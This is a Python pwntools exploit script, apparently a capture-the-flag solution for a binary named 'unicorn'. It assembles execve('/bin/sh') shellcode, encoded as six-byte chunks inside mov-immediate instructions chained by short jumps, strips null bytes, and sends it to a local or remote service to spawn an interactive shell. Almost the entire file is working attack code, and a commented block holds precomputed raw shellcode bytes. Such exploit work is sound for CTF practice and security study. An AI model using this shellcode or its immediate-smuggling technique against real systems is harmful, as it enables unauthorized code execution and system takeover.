#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './unicorn'
context.terminal = ['tmux', 'new-window']
argv = []
env = {}

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def emit(ins):
    a = asm(ins)
    if len(a) > 6:
        print("too big: ", ins, len(ins))
        exit(0)
    a += (6 - len(a))*b"\x90"
    a += asm("jmp $+4")

    inst = f"mov rax, {hex(int.from_bytes(a, 'little'))}"

    return asm(inst)

print("[+] building sc")
sc = '''
test rax, rax
jnz $+4
'''

sc = asm(sc)

sc += emit("push 0x68")
sc += emit("mov edx, 0x732f2f2f")
sc += emit("shl rdx, 32")
sc += emit("mov ebx, 0x6e69622f")
sc += emit("add rdx, rbx")
sc += emit("push rdx")
sc += emit("mov rdi, rsp")

sc += emit("mov esi, 0x10101010")
sc += emit(f"sub esi, {hex(0x10101010 - 0x6873)}")
sc += emit("push rsi")

sc += emit("xor esi, esi")
sc += emit("push rsi")
sc += emit("push 8")
sc += emit("pop rsi")
sc += emit("add rsi, rsp")
sc += emit("push rsi")
sc += emit("mov rsi, rsp")

sc += emit("xor edx, edx")
sc += emit("push 0x3b")
sc += emit("pop rax")
sc += emit("syscall")

sc += b"\x90"*0x80

'''
sc = b'H\x85\xc0u\x02H\xb8jh\x90\x90\x90\x90\xeb\x02H\xb8\xba///s\x90\xeb\x02H\xb8H\xc1\xe2 \x90\x90\xeb\x02H\xb8\xbb/bin\x90\xeb\x02H\xb8H\x01\xda\x90\x90\x90\xeb\x02H\xb8R\x90\x90\x90\x90\x90\xeb\x02H\xb8H\x89\xe7\x90\x90\x90\xeb\x02H\xb8\xbe\x10\x10\x10\x10\x90\xeb\x02H\xb8\x81\xee\x9d\xa7\x0f\x10\xeb\x02H\xb8V\x90\x90\x90\x90\x90\xeb\x02H\xb81\xf6\x90\x90\x90\x90\xeb\x02H\xb8V\x90\x90\x90\x90\x90\xeb\x02H\xb8j\x08\x90\x90\x90\x90\xeb\x02H\xb8^\x90\x90\x90\x90\x90\xeb\x02H\xb8H\x01\xe6\x90\x90\x90\xeb\x02H\xb8V\x90\x90\x90\x90\x90\xeb\x02H\xb8H\x89\xe6\x90\x90\x90\xeb\x02H\xb81\xd2\x90\x90\x90\x90\xeb\x02H\xb8j;\x90\x90\x90\x90\xeb\x02H\xb8X\x90\x90\x90\x90\x90\xeb\x02H\xb8\x0f\x05\x90\x90\x90\x90\xeb\x02\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x00'

with open("win.bin", "wb") as f:
    f.write(sc)
    exit(0)
'''

if b"\x00" in sc:
    print("zero byte fk")
    exit(0)

sc += b"\x00"

print(len(sc))
print(sc)

io = start(argv, env=env)

io.sendlineafter("Bytecode: ", sc)

io.interactive()

